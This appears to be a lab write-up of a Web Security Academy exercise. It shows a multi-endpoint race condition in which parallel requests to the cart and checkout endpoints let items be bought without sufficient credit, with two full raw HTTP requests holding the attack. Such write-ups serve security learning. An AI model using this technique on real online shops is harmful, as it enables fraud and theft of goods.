# Multi Endpoint Race Condition

The shop has 2 security-sensitive endpoints:

`POST /cart`

`POST /cart/checkout` 

The 1st one adds an item to the cart, 2nd one verifies the funds and processes the checkout.

However, the following race condition attack is possible:

1. Cart has items & can be purchased (i.e. bypassing Business flaw logic of “Cart is empty”)

2. With a cart that can be purchased, If we send `POST /cart`  and `POST /cart/checkout` in parallel using Repeater (Send group in parallel)

3. When met certain timing, the order may be verified before it checked out. So, there is a window when we can add infinite products to the cart before it’s checked out, and still succeed. This way, we can purchase items we didn’t have credits for.

```bash
POST /cart HTTP/2
Host: 0ab50027049569e68108936b0032001d.web-security-academy.net
Cookie: session=pX2s8QO5Cp5BuLMvEFXU9vOYucBv8JOV
Content-Length: 36
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="123", "Not:A-Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0ab50027049569e68108936b0032001d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab50027049569e68108936b0032001d.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

productId=1&redir=PRODUCT&quantity=1
```

```bash
POST /cart/checkout HTTP/2
Host: 0ab50027049569e68108936b0032001d.web-security-academy.net
Cookie: session=pX2s8QO5Cp5BuLMvEFXU9vOYucBv8JOV
Content-Length: 37
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="123", "Not:A-Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0ab50027049569e68108936b0032001d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab50027049569e68108936b0032001d.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

csrf=zShy65HjGL92qVedpI2Q2TUYBM8pfoF2
```

![image.png](Multi%20Endpoint%20Race%20Condition/image.png)

![image.png](Multi%20Endpoint%20Race%20Condition/image%201.png)